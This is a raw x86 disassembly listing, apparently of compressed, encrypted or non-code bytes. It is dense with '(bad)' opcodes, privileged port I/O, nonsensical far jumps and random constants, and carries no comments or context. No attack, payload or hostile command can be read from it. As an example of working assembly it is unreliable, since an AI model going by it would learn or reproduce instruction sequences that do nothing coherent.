  40f7ae:	div    BYTE PTR [ecx+eiz*8]
  40f7b1:	or     ebp,DWORD PTR [ecx+ecx*8-0x17]
  40f7b5:	sub    al,0xd4
  40f7b7:	inc    ebx
  40f7b8:	mov    BYTE PTR [edi+0x6d],dl
  40f7bb:	(bad)
  40f7be:	cdq    
  40f7bf:	mov    edx,0x1e86dd57
  40f7c4:	xchg   ebx,eax
  40f7c5:	mov    eax,ds:0xe2c125dd
  40f7ca:	adc    eax,0x273b46eb
  40f7cf:	push   eax
  40f7d0:	push   0x4a9c5adc
  40f7d5:	mov    eax,ds:0xe1c286fd
  40f7da:	push   ecx
  40f7db:	inc    ebp
  40f7dc:	or     ecx,DWORD PTR [eax]
  40f7de:	out    dx,eax
  40f7df:	gs fsubr st,st(1)
  40f7e2:	dec    ecx
  40f7e3:	ins    DWORD PTR es:[edi],dx
  40f7e4:	mov    ds:0xa80eb5f1,al
  40f7e9:	test   edx,0x56d1b099
  40f7ef:	jmp    0xc8b2:0x7b120625
  40f7f6:	push   0x278d414e
  40f7fb:	mov    al,0xd7
  40f7fd:	inc    esp
  40f7fe:	xchg   ebx,eax
  40f7ff:	lods   eax,DWORD PTR ds:[esi]
  40f800:	into   
  40f801:	mov    esp,0x29d84974
  40f806:	or     DWORD PTR [eax+0x77],0xffffffce
  40f80a:	ret    
  40f80b:	jnp    0x40f791
  40f80d:	rol    BYTE PTR [edx+0x1d290307],cl
  40f813:	ret    0x6eda
  40f816:	jae    0x40f845
  40f818:	push   esp
  40f819:	iret   
  40f81a:	loopne 0x40f7ea
  40f81c:	xchg   edi,eax
  40f81d:	jp     0x40f896
  40f81f:	mov    eax,0xb4517e3b
  40f824:	xor    DWORD PTR [esi+ecx*8],ebx
  40f827:	jnp    0x40f881
  40f829:	mov    DWORD PTR [esi-0x4b210ef3],esp
  40f82f:	aad    0xe1
  40f831:	push   0x28
  40f833:	js     0x40f834
  40f835:	jo     0x40f870
  40f837:	and    cl,BYTE PTR [esi-0x5a3698cf]
  40f83d:	jno    0x40f83b
  40f83f:	enter  0xa95b,0xa3
  40f843:	push   ds
  40f844:	mov    ah,0x80
  40f846:	sub    eax,0xa588e250
  40f84b:	aas    
  40f84c:	pop    eax
  40f84d:	mov    bl,0x65
  40f84f:	dec    ebp
  40f850:	(bad)  
  40f851:	in     al,dx
  40f852:	in     eax,dx
  40f853:	sub    ecx,edx
  40f855:	ja     0x40f801
  40f857:	and    BYTE PTR [edi],0x40
  40f85a:	mov    ebp,0xddeb3884
  40f85f:	mov    bl,0xb2
  40f861:	inc    ecx
  40f862:	dec    ebp
  40f863:	xchg   edx,eax
  40f864:	or     ch,BYTE PTR [edx+0x7635a166]
  40f86a:	shl    DWORD PTR [edi+0x23],0xb7
  40f86e:	das    
  40f86f:	push   cs
  40f870:	arpl   WORD PTR fs:[ecx+0x63],sp
  40f874:	xor    dh,BYTE PTR [eax]
  40f876:	in     eax,dx
  40f877:	adc    DWORD PTR [edi+0x51c9fab],0xec568f22
  40f881:	test   DWORD PTR [eax],ecx
  40f883:	cmp    DWORD PTR [eax+0x12],edi
  40f886:	xor    al,0xae
  40f888:	in     al,0x97
  40f88a:	sti    
  40f88b:	fnstenv [ecx]
  40f88d:	je     0x40f8dd
  40f88f:	inc    eax
  40f890:	inc    ebx
  40f891:	fiadd  DWORD PTR [esi]
  40f893:	(bad)  
  40f894:	cmp    al,0x6
  40f896:	fxtract 
  40f898:	sahf   
  40f899:	fsub   st,st(0)
  40f89b:	jle    0x40f833
  40f89d:	test   esi,esi
  40f89f:	push   eax
  40f8a0:	sti    
  40f8a1:	vpperm ymm12,ymm7,ymm4,YMMWORD PTR [eax-0x39]
  40f8a8:	mov    dl,0x66
  40f8aa:	call   0xf317:0xb6e6c84b
  40f8b1:	jne    0x40f92e
  40f8b3:	and    DWORD PTR [esi+0x68],edi
  40f8b6:	repz cmc 
  40f8b8:	mov    ecx,0x62eb9f29
  40f8bd:	sar    bh,0x53
  40f8c0:	ins    DWORD PTR es:[edi],dx
  40f8c1:	jne    0x40f92b
  40f8c3:	fcmovu st,st(1)
  40f8c5:	pushf  
  40f8c6:	mov    edx,0xd35f037c
  40f8cb:	pop    ds
  40f8cc:	mov    cl,al
  40f8ce:	push   esp
  40f8cf:	add    eax,0x1344148e
  40f8d4:	rcr    BYTE PTR [edx+0x58],1
  40f8d7:	inc    esp
  40f8d8:	(bad)  
  40f8d9:	mov    eax,0x907a19bb
  40f8de:	lds    ebx,FWORD PTR [esi-0x5a]
  40f8e1:	push   ss
  40f8e2:	mov    BYTE PTR [ecx],bh
  40f8e4:	call   0xb316:0x9bbca51c
  40f8eb:	clc    
  40f8ec:	bound  eax,QWORD PTR [esi+edi*8-0x68]
  40f8f0:	xchg   ebx,eax
  40f8f1:	dec    sp
  40f8f3:	cwde   
  40f8f4:	mov    dl,0x20
  40f8f6:	or     edx,DWORD PTR [ebx-0x5338bb57]
  40f8fc:	sbb    edx,ebx
  40f8fe:	xchg   edi,eax
  40f8ff:	mov    esi,?
  40f901:	sbb    bh,bh
  40f903:	xor    al,0xac
  40f905:	loope  0x40f93c
  40f907:	jo     0x40f960
  40f909:	push   0xb2b51008
  40f90e:	data16 int 0x4d
  40f911:	bound  esp,QWORD PTR cs:[edx]
  40f914:	adc    cl,cl
  40f916:	in     al,dx
  40f917:	adc    al,BYTE PTR [ebx]
  40f919:	push   DWORD PTR [edi+esi*8]
  40f91c:	mov    ch,0x14
  40f91e:	es inc edx
  40f920:	(bad)  
  40f921:	jle    0x40f947
  40f923:	in     al,dx
  40f924:	and    ebx,DWORD PTR [edx]
  40f926:	in     al,0xac
  40f928:	scas   al,BYTE PTR es:[edi]
  40f929:	add    BYTE PTR [edi-0x49bf22a8],ch
  40f92f:	aad    0x43
  40f931:	xor    DWORD PTR [ebp-0x19843b65],0xffffffa2
  40f938:	enter  0xbba8,0xb0
  40f93c:	idiv   ecx
  40f93e:	ds (bad) 
  40f940:	ins    BYTE PTR es:[edi],dx
  40f941:	adc    DWORD PTR [edi+0x7a],esp
  40f944:	add    ch,BYTE PTR ds:[ebp+0x47d292c9]
  40f94b:	mov    esi,0x5dc1cadd
  40f950:	ror    DWORD PTR [edx+0x42a5bc83],cl
  40f956:	ret    0x65df
  40f959:	dec    eax
  40f95a:	or     BYTE PTR [edx+eiz*1-0x12665000],dl
  40f961:	out    dx,eax
  40f962:	jmp    0x40f915
  40f964:	sbb    dh,ah
  40f966:	aas    
  40f967:	xor    DWORD PTR cs:[ebp-0x755ddec3],ebx
  40f96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f96f:	scas   eax,DWORD PTR es:[edi]
  40f970:	push   0x7bdcc5ad
  40f975:	push   esi
  40f976:	js     0x40f9ba
  40f978:	push   ebp
  40f979:	scas   al,BYTE PTR es:[edi]
  40f97a:	arpl   WORD PTR [edx+0x4f],bp
  40f97d:	loopne 0x40f944
  40f97f:	sti    
  40f980:	mov    dl,0x85
  40f982:	pusha  
  40f983:	enter  0xab82,0xa1
  40f987:	and    DWORD PTR [edx+0x71],0x7b5ce4c2
  40f98e:	adc    eax,DWORD PTR [ecx-0x33]
  40f991:	jns    0x40f9bf
  40f993:	aaa    
  40f994:	xchg   BYTE PTR [esi-0x38],ah
  40f997:	(bad)  
  40f998:	and    DWORD PTR [ecx+0x0],esp
  40f99b:	dec    ecx
  40f99c:	dec    esp
  40f99d:	test   DWORD PTR [edi+eax*1],ebp
  40f9a0:	sahf   
  40f9a1:	stc    
  40f9a2:	addr16 div dh
  40f9a5:	jbe    0x40f9c5
  40f9a7:	sbb    DWORD PTR [ecx+0x33],edi
  40f9aa:	rcr    BYTE PTR [edx+0xfe5ec03],0x98
  40f9b1:	idiv   DWORD PTR [bp+di]
  40f9b4:	popf   
  40f9b5:	inc    esp
  40f9b6:	in     al,dx
  40f9b7:	dec    DWORD PTR [ecx+ecx*1]
  40f9ba:	(bad)  
  40f9bb:	fld    TBYTE PTR [edi]
  40f9bd:	in     eax,0x1f
  40f9bf:	push   0xd8648979
  40f9c4:	mov    cs,WORD PTR [edx-0x5c]
  40f9c7:	pop    ecx
  40f9c8:	or     eax,0xf9248fda
  40f9cd:	add    ebx,DWORD PTR [edx]
  40f9cf:	xchg   ebp,eax
  40f9d0:	fstp   TBYTE PTR [ecx+0x67]
  40f9d3:	xor    esp,DWORD PTR [eax+ecx*4+0x47cd5d00]
  40f9da:	fdivp  st(4),st
  40f9dc:	(bad)  
  40f9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9de:	xchg   edx,eax
  40f9df:	add    eax,0x31aa9e4c
  40f9e4:	call   0x61cbc1b9
  40f9e9:	dec    ebx
  40f9ea:	imul   ebx,DWORD PTR [esi+edi*8],0xe52f3430
  40f9f1:	test   BYTE PTR [edi+edi*8-0x4c],bl
  40f9f5:	mov    edi,DWORD PTR [edx]
  40f9f7:	shl    DWORD PTR [ecx],1
  40f9f9:	inc    edx
  40f9fa:	or     edi,edx
  40f9fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9fd:	into   
  40f9fe:	and    esp,DWORD PTR [ebx]
  40fa00:	punpckhwd mm7,QWORD PTR [ecx]
  40fa03:	fs add ebp,DWORD PTR ds:[edx-0x25]
  40fa08:	push   esp
  40fa09:	aad    0xa4
  40fa0b:	data16 adc bl,bh
  40fa0e:	mov    ecx,0xa91981f8
  40fa13:	mov    ecx,0x73f57f
  40fa18:	xchg   edx,eax
  40fa19:	adc    al,0xbc
  40fa1b:	push   ss
  40fa1c:	test   eax,0x4cee4dee
  40fa21:	mov    esp,0x4cfe50f7
  40fa26:	or     eax,0x5015fa74
  40fa2b:	cmp    ch,BYTE PTR [eax+0x6d]
  40fa2e:	inc    ebp
  40fa2f:	sub    eax,0x851f9b0
  40fa34:	fwait
  40fa35:	adc    ch,BYTE PTR [edx-0x7a]
  40fa38:	stc    
  40fa39:	sub    eax,0x308588bd
  40fa3f:	add    ebx,edi
  40fa41:	imul   ebp,DWORD PTR [ebx-0xb35ecd],0x15
  40fa48:	sar    BYTE PTR [ebx],0x3d
  40fa4b:	jo     0x40fa7f
  40fa4d:	jb     0x40fa4e
  40fa4f:	fstp   TBYTE PTR [edi+eiz*4+0x28823af9]
  40fa56:	mov    edi,0x41f8ff85
  40fa5b:	hlt    
  40fa5c:	mov    DWORD PTR [esi],esp
  40fa5e:	nop
  40fa5f:	sbb    DWORD PTR ds:0xe391036e,esi
  40fa65:	push   0xffffffe7
  40fa67:	es sbb eax,0xb9ac3097
  40fa6d:	sbb    al,0x12
  40fa6f:	or     ebp,esi
  40fa71:	(bad)  
  40fa73:	jae    0x40fa2b
  40fa75:	gs mov bl,0x85
  40fa78:	dec    ebp
  40fa79:	adc    BYTE PTR [edi-0x287677b5],dl
  40fa7f:	pop    es
  40fa80:	mov    al,ds:0x7daa165
  40fa85:	pop    ebx
  40fa86:	daa    
  40fa87:	ret    0x3ae3
  40fa8a:	xlat   BYTE PTR ds:[ebx]
  40fa8b:	mov    eax,gs:0xe8bad26e
  40fa91:	mov    ecx,0xcb6161fa
  40fa97:	jbe    0x40fa93
  40fa99:	sub    eax,0x75fb37d0
  40fa9e:	lods   eax,DWORD PTR ds:[esi]
  40fa9f:	mov    al,0xfd
  40faa1:	cdq    
  40faa2:	dec    ebx
  40faa3:	cmp    ebx,DWORD PTR [edi-0x76]
  40faa6:	cmp    eax,0x7feb8319
  40faab:	rcl    DWORD PTR [ecx+0x7f5fd12c],0x7b
  40fab2:	fstp   QWORD PTR [edx-0xb82fe72]
  40fab8:	push   esp
  40fab9:	sbb    eax,0x7e13d5fe
  40fabe:	js     0x40facf
  40fac0:	xor    BYTE PTR ds:0xff18bc86,dh
  40fac6:	pushf  
  40fac7:	scas   eax,DWORD PTR es:[edi]
  40fac8:	fidiv  DWORD PTR [edx-0x17]
  40facb:	push   0x1dc31cf0
  40fad0:	(bad)  
  40fad1:	xchg   edx,eax
  40fad2:	mov    eax,0x7ced6e56
  40fad7:	stos   DWORD PTR es:[edi],eax
  40fad8:	sub    esi,edx
  40fada:	jbe    0x40fb45
  40fadc:	dec    ecx
  40fadd:	xchg   ebx,eax
  40fade:	mov    cl,0x66
  40fae0:	push   cs
  40fae1:	adc    eax,DWORD PTR [edx-0x39]
  40fae4:	std    
  40fae5:	ret    
  40fae6:	xchg   DWORD PTR [edx],esi
  40fae8:	test   BYTE PTR ds:0xfcea8c90,cl
  40faee:	mov    ebx,0x7e908dc0
  40faf3:	sbb    cl,BYTE PTR [ecx-0x33]
  40faf6:	sar    DWORD PTR [edx+0x24],cl
  40faf9:	mov    BYTE PTR [edi-0x774e8dc8],0xe9
  40fb00:	push   0xfffffffe
  40fb02:	and    ah,al
  40fb04:	das    
  40fb05:	cmc    
  40fb06:	xchg   edx,eax
  40fb07:	cmp    DWORD PTR [edi],ebp
  40fb09:	and    cl,BYTE PTR [ebp-0x2e11d7ad]
  40fb0f:	jg     0x40faf9
  40fb11:	push   0xffffff88
  40fb13:	ds leave 
  40fb15:	cmp    eax,ecx
  40fb17:	inc    eax
  40fb18:	mov    DWORD PTR [eax-0x1435bf10],esp
  40fb1e:	mov    al,ds:0xf8c6f363
  40fb23:	imul   eax,DWORD PTR [edi],0xec5ab070
  40fb29:	pop    edi
  40fb2a:	jg     0x40fb04
  40fb2c:	push   ebp
  40fb2d:	pop    esp
  40fb2e:	dec    si
  40fb30:	push   0x1f186750
  40fb35:	sbb    al,0xc4
  40fb37:	sbb    bl,bh
  40fb39:	jmp    0x40fbba
  40fb3b:	mov    ds:0x27f8ac9f,eax
  40fb40:	jg     0x40fb27
  40fb42:	fldcw  WORD PTR [esi+0x546361de]
  40fb48:	inc    ebp
  40fb49:	scas   eax,DWORD PTR es:[edi]
  40fb4a:	mov    ds:0xa91e188d,al
  40fb4f:	mov    ds:0xe62f4040,al
  40fb54:	inc    edi
  40fb55:	dec    edx
  40fb56:	aaa    
  40fb57:	outs   dx,BYTE PTR ds:[esi]
  40fb58:	lods   eax,DWORD PTR fs:[esi]
  40fb5a:	xor    edx,DWORD PTR [edi+edx*4]
  40fb5d:	or     bh,BYTE PTR [edx-0x30]
  40fb60:	add    al,0x86
  40fb62:	sub    dl,BYTE PTR [edi-0x28]
  40fb65:	in     eax,0x57
  40fb67:	mov    ds:0xb944ca40,al
  40fb6c:	mov    esp,0x2afe0ec9
  40fb71:	mov    BYTE PTR [ecx-0x16f39d31],bl
  40fb77:	or     al,0x74
  40fb79:	mov    ah,0x9d
  40fb7b:	mov    eax,ds:0x72132e05
  40fb80:	je     0x40fbd5
  40fb82:	jg     0x40fb5b
  40fb84:	test   BYTE PTR [ecx],bl
  40fb86:	stos   BYTE PTR es:[edi],al
  40fb87:	sti    
  40fb88:	bound  ebp,QWORD PTR [eax-0x37]
  40fb8b:	xor    al,0x26
  40fb8d:	push   ss
  40fb8e:	push   ss
  40fb8f:	xchg   ebp,eax
  40fb90:	data16 lock jne 0x40fbb2
  40fb94:	aaa    
  40fb95:	icebp  
  40fb96:	enter  0x4a82,0xf9
  40fb9a:	and    BYTE PTR [eax+edi*2],ch
  40fb9d:	adc    eax,0x7e8a82ef
  40fba2:	pop    es
  40fba3:	mov    ah,0x1
  40fba5:	sti    
  40fba6:	dec    ebx
  40fba7:	lods   eax,DWORD PTR ds:[esi]
  40fba8:	jnp    0x40fbd8
  40fbaa:	mov    esp,0xd21064a
  40fbaf:	sbb    al,0x6e
  40fbb2:	daa    
  40fbb3:	ins    DWORD PTR es:[edi],dx
  40fbb4:	and    eax,0xcc723d5b
  40fbb9:	test   BYTE PTR ds:0xa6e33f7c,dl
  40fbbf:	xor    dh,BYTE PTR [esp+eax*1]
  40fbc2:	test   DWORD PTR [edi+0x33],ebx
  40fbc5:	shl    ebp,cl
  40fbc7:	rol    DWORD PTR [edi+0x45b72887],1
  40fbcd:	mov    ebp,0x1664120e
  40fbd2:	in     eax,0x77
  40fbd4:	aad    0x54
  40fbd6:	and    eax,0xfcb8c347
  40fbdb:	popf   
  40fbdc:	and    dl,bl
  40fbde:	dec    esp
  40fbdf:	ds push cs
  40fbe1:	push   0xffffffa3
  40fbe3:	xchg   ebx,eax
  40fbe4:	jge    0x40fc61
  40fbe6:	mov    ebx,0xefebb6fc
  40fbeb:	adc    BYTE PTR [edi-0x1d68ce83],ch
  40fbf1:	jbe    0x40fbd6
  40fbf3:	cmp    al,0x5a
  40fbf5:	cmp    al,0xe
  40fbf7:	mov    WORD PTR [ecx+edx*2],?
  40fbfa:	pusha  
  40fbfb:	fst    st(7)
  40fbfd:	cmp    al,0x7b
  40fbff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc00:	dec    ebp
  40fc01:	mov    esp,0x324e5942
  40fc06:	mov    esp,0x24ddc4a8
  40fc0b:	pop    ecx
  40fc0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc0d:	sub    al,0x91
  40fc0f:	ja     0x40fbb9
  40fc11:	fbld   TBYTE PTR [ebx]
  40fc13:	ins    DWORD PTR es:[edi],dx
  40fc14:	(bad)  
  40fc16:	lods   eax,DWORD PTR ds:[esi]
  40fc17:	test   al,0x3c
  40fc19:	cmp    al,0xa
  40fc1b:	inc    esp
  40fc1c:	sub    eax,0x4230bd1
  40fc21:	test   al,0x59
  40fc23:	pop    ecx
  40fc24:	fdivr  DWORD PTR [ebx+esi*1+0x55]
  40fc28:	arpl   cx,cx
  40fc2a:	mov    cl,0x50
  40fc2c:	scas   eax,DWORD PTR es:[edi]
  40fc2d:	cwde   
  40fc2e:	rcl    BYTE PTR [edx-0x4f33e870],0x69
  40fc35:	dec    eax
  40fc36:	lods   eax,DWORD PTR ds:[esi]
  40fc37:	and    DWORD PTR ds:0xb524d2c5,esi
  40fc3d:	js     0x40fbd3
  40fc3f:	pop    eax
  40fc40:	clc    
  40fc41:	mov    WORD PTR [ecx+eiz*8],gs
  40fc44:	xchg   ebx,eax
  40fc45:	dec    ecx
  40fc46:	ret    0xd08f
  40fc49:	aaa    
  40fc4a:	cmp    eax,0x9597df68
  40fc4f:	mov    bh,ch
  40fc51:	sub    DWORD PTR [eax],edi
  40fc53:	cmp    al,0xd8
  40fc55:	ret    
  40fc56:	ins    BYTE PTR es:[edi],dx
  40fc57:	jecxz  0x40fc69
  40fc59:	out    dx,eax
  40fc5a:	xchg   esp,eax
  40fc5b:	mov    ecx,0x75ca03e6
  40fc60:	push   es
  40fc61:	mov    edi,0xb1d0f6db
  40fc66:	xchg   BYTE PTR [ebp-0x22736941],ah
  40fc6c:	shl    BYTE PTR [edx+0x3a],0xda
  40fc70:	add    BYTE PTR [ebx+0x4],bh
  40fc73:	cmp    eax,DWORD PTR [ebp-0xc]
  40fc76:	nop
  40fc77:	shl    BYTE PTR [ecx],1
  40fc79:	mov    ds:0xcce1edba,al
  40fc7e:	cdq    
  40fc7f:	xchg   esp,eax
  40fc80:	adc    edi,DWORD PTR [ebx+0x725cae42]
  40fc86:	push   ecx
  40fc87:	inc    esi
  40fc88:	xchg   BYTE PTR [esi+0x5f0f727a],bh
  40fc8e:	adc    bh,BYTE PTR [edx+edi*1]
  40fc91:	in     al,0x87
  40fc93:	pop    es
  40fc94:	jl     0x40fce0
  40fc96:	in     al,dx
  40fc97:	cmp    eax,0x7507c13f
  40fc9c:	iret   
  40fc9d:	mov    al,ds:0xa33e1042
  40fca2:	mov    esp,0x47108232
  40fca7:	push   ebp
  40fca8:	add    al,BYTE PTR [ecx-0x59dacd0e]
  40fcae:	mov    eax,0x17d462b7
  40fcb3:	in     eax,0x3d
  40fcb5:	(bad)  
  40fcb7:	aad    0x1d
  40fcb9:	adc    DWORD PTR [eax+0x40],esp
  40fcbc:	xor    BYTE PTR [eax+0x13f4faaf],ah
  40fcc2:	retf   0xbf80
  40fcc5:	or     bl,BYTE PTR [edx+0x5a]
  40fcc8:	xchg   edi,eax
  40fcc9:	test   cl,dl
  40fccb:	popf   
  40fccc:	into   
  40fccd:	pusha  
  40fcce:	cmc    
  40fccf:	retf   
  40fcd0:	mov    edi,es
  40fcd2:	(bad)  
  40fcd3:	jae    0x40fc63
  40fcd5:	dec    ebx
  40fcd6:	fisttp QWORD PTR [ecx]
  40fcd8:	mov    ds:0x51c214d9,eax
  40fcdd:	adc    ebx,ecx
  40fcdf:	scas   eax,DWORD PTR es:[edi]
  40fce0:	or     edx,DWORD PTR [esi-0x49]
  40fce3:	adc    bh,BYTE PTR [esi-0x2d]
  40fce6:	pxor   mm0,QWORD PTR [edx+0x7d]
  40fcea:	sub    esi,0x76
  40fced:	pop    esi
  40fcee:	or     esp,ecx
  40fcf0:	int    0x61
  40fcf2:	and    edx,DWORD PTR [ebp+0xaae6f7c]
  40fcf8:	cmp    al,0x1e
  40fcfa:	ror    BYTE PTR [ebp-0x17],cl
  40fcfd:	in     eax,dx
  40fcfe:	gs dec ebx
  40fd00:	xor    BYTE PTR [edi+0x7a],cl
  40fd03:	pop    esp
  40fd04:	cs jmp 0x40fd6d
  40fd07:	inc    ebx
  40fd08:	lea    edi,[ebx+ebp*4-0x17]
  40fd0c:	scas   al,BYTE PTR es:[edi]
  40fd0d:	adc    al,BYTE PTR ds:0x825a0e85
  40fd13:	push   eax
  40fd14:	pop    ds
  40fd15:	mov    dh,0xb4
  40fd17:	(bad)  
  40fd18:	pushf  
  40fd19:	push   esp
  40fd1a:	ret    0x9460
  40fd1d:	fistp  DWORD PTR [edi+0x2419b4cd]
  40fd23:	sbb    al,BYTE PTR [ecx+0x4e]
  40fd26:	xchg   edi,eax
  40fd27:	shl    bh,0xa9
  40fd2a:	dec    edx
  40fd2b:	int    0x5d
  40fd2d:	push   esi
  40fd2e:	in     al,dx
  40fd2f:	pop    ecx
  40fd30:	into   
  40fd31:	inc    ebx
  40fd32:	and    esp,DWORD PTR [edi-0x33]
  40fd35:	hlt    
  40fd36:	add    esi,edi
  40fd38:	jns    0x40fcba
  40fd3a:	outs   dx,DWORD PTR ds:[esi]
  40fd3b:	arpl   WORD PTR [esi],cx
  40fd3d:	mov    dh,0x3c
  40fd3f:	retf   0x4f9e
  40fd42:	push   ebx
  40fd43:	in     eax,dx
  40fd44:	mov    ds:0x455a299,al
  40fd49:	pop    ebp
  40fd4a:	(bad)  
  40fd4b:	jmp    0x3551fdba
  40fd50:	inc    ebp
  40fd51:	jns    0x40fd8f
  40fd53:	int3   
  40fd54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd55:	mov    BYTE PTR [ebp+ecx*4+0x52e661bd],ah
  40fd5c:	mov    esi,DWORD PTR [esi+ebp*4]
  40fd5f:	rcr    bh,0x47
  40fd62:	jle    0x40fd4c
  40fd64:	mov    fs,ecx
  40fd66:	and    BYTE PTR [esi-0x7b1623ab],ah
  40fd6c:	shr    BYTE PTR [ecx-0x14db8d5a],0xd2
  40fd73:	dec    ebx
  40fd74:	stos   DWORD PTR es:[edi],eax
  40fd75:	sbb    BYTE PTR [ebx-0x116e0a6f],dl
  40fd7b:	test   eax,0x521b6ebb
  40fd80:	out    dx,al
  40fd81:	pop    eax
  40fd82:	aam    0xbe
  40fd84:	enter  0x2d6,0xf6
  40fd88:	scas   al,BYTE PTR es:[edi]
  40fd89:	xchg   esi,eax
  40fd8a:	or     al,0x67
  40fd8c:	jo     0x40fd7d
  40fd8e:	out    0x51,eax
  40fd90:	inc    ebx
  40fd91:	cs (bad) 
  40fd93:	jns    0x40fdef
  40fd95:	std    
  40fd96:	xchg   esp,eax
  40fd97:	pop    esp
  40fd98:	jecxz  0x40fd9b
  40fd9a:	aad    0x66
  40fd9c:	xor    al,0xad
  40fd9e:	scas   eax,DWORD PTR es:[edi]
  40fd9f:	int    0xf8
  40fda1:	or     cl,BYTE PTR [edx-0x65cc96f0]
  40fda7:	mov    eax,ds:0x8b564f02
  40fdac:	data16 jns 0x40fdad
  40fdaf:	xlat   BYTE PTR ds:[ebx]
  40fdb0:	loop   0x40fd80
  40fdb2:	loop   0x40fe1a
  40fdb4:	jg     0x40fd82
  40fdb6:	call   FWORD PTR [ecx-0xb]
  40fdb9:	xchg   ecx,eax
  40fdba:	(bad)  
  40fdbb:	mov    bh,0x1e
  40fdbd:	stos   BYTE PTR es:[edi],al
  40fdbe:	push   ebp
  40fdbf:	add    BYTE PTR [ebp-0x4ca633c6],al
  40fdc5:	push   ds
  40fdc6:	cli    
  40fdc7:	fs jecxz 0x40fdc4
  40fdca:	pop    ebp
  40fdcb:	mov    ebx,0x9a356e06
  40fdd0:	and    DWORD PTR [ecx],ebx
  40fdd2:	push   edx
  40fdd3:	cs iret 
  40fdd5:	push   0x3f
  40fdd7:	mov    ebp,ebx
  40fdd9:	retf   0xca22
  40fddc:	xchg   edx,eax
  40fddd:	mov    bl,0xbd
  40fddf:	dec    ebx
  40fde0:	xor    al,0x7c
  40fde2:	lea    ebx,[ebx]
  40fde4:	bound  esi,QWORD PTR [ebp-0x392fd12c]
  40fdea:	sbb    bl,al
  40fdec:	add    bl,BYTE PTR [esi+0x578af084]
  40fdf2:	js     0x40fe3d
  40fdf4:	les    ebp,FWORD PTR [ebx]
  40fdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdf7:	or     DWORD PTR [esi+0x78448081],ebx
  40fdfd:	dec    eax
  40fdfe:	ja     0x40fe0c
  40fe00:	nop
  40fe01:	push   edx
  40fe02:	add    BYTE PTR [ecx-0x53],0xdf
  40fe06:	and    al,0x37
  40fe08:	mov    edi,0xe8526706
  40fe0d:	imul   eax,DWORD PTR [ebp+0xb],0xee8a8d7b
  40fe14:	out    0xd2,al
  40fe16:	and    al,0xc5
  40fe18:	mov    ds:0x3a62beb0,eax
  40fe1d:	mov    eax,0xad27d462
  40fe22:	jo     0x40fe8e
  40fe24:	xchg   esi,eax
  40fe25:	fmul   st,st(5)
  40fe27:	out    0x12,eax
  40fe29:	(bad)  
  40fe2a:	repnz addr16 in eax,0xb1
  40fe2e:	leave  
  40fe2f:	cs adc eax,0x8beab43e
  40fe35:	rcr    DWORD PTR [edi],1
  40fe37:	inc    esp
  40fe38:	shl    esp,cl
  40fe3a:	iret   
  40fe3b:	inc    esp
  40fe3c:	mov    bl,0xf7
  40fe3e:	ja     0x40fe53
  40fe40:	push   es
  40fe41:	aaa    
  40fe42:	cmp    al,0xf4
  40fe44:	(bad)  
  40fe45:	hlt    
  40fe46:	inc    esi
  40fe47:	arpl   WORD PTR [esi-0x5cc3bbc0],bp
  40fe4d:	or     al,0x49
  40fe4f:	add    edi,eax
  40fe51:	pop    ebx
  40fe52:	cmp    al,0x32
  40fe54:	cmp    bl,BYTE PTR [eax]
  40fe56:	mov    BYTE PTR [eax],0x4e
  40fe59:	and    BYTE PTR [ebx-0x4a],ch
  40fe5c:	lahf   
  40fe5d:	jl     0x40feaa
  40fe5f:	pop    ds
  40fe60:	imul   ecx,DWORD PTR [ebp+ebp*1-0x3b],0x78
  40fe65:	jbe    0x40fe55
  40fe67:	daa    
  40fe68:	sbb    DWORD PTR [edx+0x1d5045fc],0xffffffa7
  40fe6f:	push   edi
  40fe70:	pop    ss
  40fe71:	mov    bl,0xb7
  40fe73:	sahf   
  40fe74:	pop    edi
  40fe75:	sbb    eax,0xa046a497
  40fe7a:	cdq    
  40fe7b:	pop    eax
  40fe7c:	dec    ebp
  40fe7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe7e:	retf   0xf1a3
  40fe81:	fs pop ebx
  40fe83:	add    DWORD PTR [ebx-0xe590cbd],esp
  40fe89:	pop    ebx
  40fe8a:	js     0x40fe86
  40fe8c:	mov    al,BYTE PTR [esi+ebp*1]
  40fe8f:	pop    edx
  40fe90:	fs pushf 
  40fe92:	jmp    0xd6b8d04e
  40fe97:	jb     0x40fe3d
  40fe99:	sbb    DWORD PTR [edi-0x1e],ebx
  40fe9c:	cld    
  40fe9d:	fisttp DWORD PTR [ecx-0x12]
  40fea0:	mov    ds:0x51f3338,al
  40fea5:	sub    esi,ebp
  40fea7:	ja     0x40fe33
  40fea9:	iret   
  40feaa:	xor    esi,edi
  40feac:	cmp    al,0xbc
  40feae:	mov    BYTE PTR [ebx-0x190aa871],cl
  40feb4:	dec    edi
  40feb5:	push   esp
  40feb6:	add    DWORD PTR [esi+edx*2-0x3d],edx
  40feba:	push   ecx
  40febb:	pop    esp
  40febc:	sbb    dl,bl
  40febe:	jle    0x40fe6d
  40fec0:	(bad)  
  40fec1:	jl     0x40fe74
  40fec3:	or     bh,BYTE PTR [ebx-0x597150a7]
  40fec9:	mov    eax,ds:0xa929c212
  40fece:	or     BYTE PTR [esi+0x1d51d81e],ah
  40fed4:	loop   0x40feeb
  40fed6:	jmp    0x40ff0e
  40fed8:	shl    ecx,0x6c
  40fedb:	and    BYTE PTR [edi],bh
  40fedd:	test   eax,0x1c1ba00d
  40fee2:	sub    DWORD PTR [eax+0x25],0x39
  40fee6:	sahf   
  40fee7:	dec    bl
  40fee9:	pop    ss
  40feea:	push   ebx
  40feeb:	mov    dl,0x3
  40feed:	lds    esi,FWORD PTR [edi-0x1c4d4078]
  40fef3:	mov    edi,0x5249801b
  40fef8:	add    eax,0x49967a8a
  40fefd:	pop    ebp
  40fefe:	gs test al,0x17
  40ff01:	jb     0x40feba
  40ff03:	adc    eax,0x4f4abd7a
  40ff08:	dec    ebx
  40ff09:	test   al,0xa7
  40ff0b:	and    bl,BYTE PTR [esi]
  40ff0d:	push   ds
  40ff0e:	lods   al,BYTE PTR ds:[esi]
  40ff0f:	div    DWORD PTR [ebp+edx*4-0x7a]
  40ff13:	cmp    al,0x84
  40ff15:	dec    esi
  40ff16:	mov    ebp,0xba2a830a
  40ff1b:	cmp    al,0x7b
